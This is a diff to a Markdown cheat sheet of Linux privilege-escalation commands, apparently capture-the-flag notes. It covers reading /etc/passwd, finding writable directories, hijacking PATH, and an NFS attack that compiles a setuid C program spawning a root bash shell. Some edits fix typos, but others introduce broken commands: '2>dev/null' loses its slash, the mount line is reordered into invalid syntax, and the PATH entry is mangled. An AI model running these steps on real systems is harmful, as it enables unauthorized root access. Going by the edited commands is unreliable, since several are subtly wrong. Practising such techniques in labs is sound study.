@@ -58,10 +58,10 @@ cat /etc/passwd | grep home
 - `netstat -l -p` - list all listening ports and the processes using them
 - `netstat -i` - show network interface statistics
 - `netstat -ano` - show all connections (`-a`), do not resolve names (`-n`), display timers (`-o`)
-- `find . -name flag1.txt` - find all files with the name `flag1.txt in the current directory
-- `find /home -name flag1.txt` - find all files with the name flag1.txt in /home
+- `find . -name flag1.txt` - find all files with the name `flag1.txt` in the current directory
+- `find /home -name flag1.txt` - find all files with the name `flag1.txt` in /home
 - `find / -type d -name config` - find the directory named config in /
-- `find / -type f -perm 0o777` - find all files with permissions of 777
+- `find / -type f -perm 0777` - find all files with permissions of 777
 - `find / -perm a=x` - find all files that can be executed
 - `find /home -user frank` - find all files for user "frank" under /home
 - `find / -mtime 10` - find files that were modified in the last 10 days
@@ -162,7 +162,7 @@ The above command will show which executables have elevated capabilities. Use th
 When finding writable folders, the output can be very long. Use the following to tidy up the output:
 
 ```bash
-find / -writable 2>*dev/null | cut -d "*" -f 2 | sort -u
+find / -writable 2>dev/null | cut -d "*" -f 2 | sort -u
 ```
 
 {: .nolineno }
@@ -170,7 +170,7 @@ find / -writable 2>*dev/null | cut -d "*" -f 2 | sort -u
 Followed by something like...
 
 ```bash
-find / -writable 2>*dev/null | grep usr | cut -d "*" -f 2,3 | sort -u
+find / -writable 2>dev/null | grep usr | cut -d "*" -f 2,3 | sort -u
 ```
 
 {: .nolineno }
@@ -178,7 +178,7 @@ find / -writable 2>*dev/null | grep usr | cut -d "*" -f 2,3 | sort -u
 or
 
 ```bash
-find / -writable 2>*dev/null | cut -d "*" -f 2,3 | grep -v proc | sort -u
+find / -writable 2>dev/null | cut -d "*" -f 2,3 | grep -v proc | sort -u
 ```
 
 {: .nolineno }
@@ -188,7 +188,7 @@ find / -writable 2>*dev/null | cut -d "*" -f 2,3 | grep -v proc | sort -u
 Add writable folders to the `$PATH` environment variable:
 
 ```bash
-export PATH=$PATH:*home*<user>
+export PATH=$PATH:home<user>
 ```
 
 {: .nolineno }
@@ -218,7 +218,7 @@ mkdir /tmp/temp
 {: .nolineno }
 
 ```bash
-mount -o rw /tmp/temp <target_ip >:/tmp
+mount -o rw <target_ip >:/tmp/ tmp/temp
 ```
 
 {: .nolineno }
@@ -237,7 +237,7 @@ vim nfs.c
 int main()
 { setgid(0);
 setuid(0);
-system("/bin/bssh");
+system("/bin/bash");
 return 0;
 }
 ```
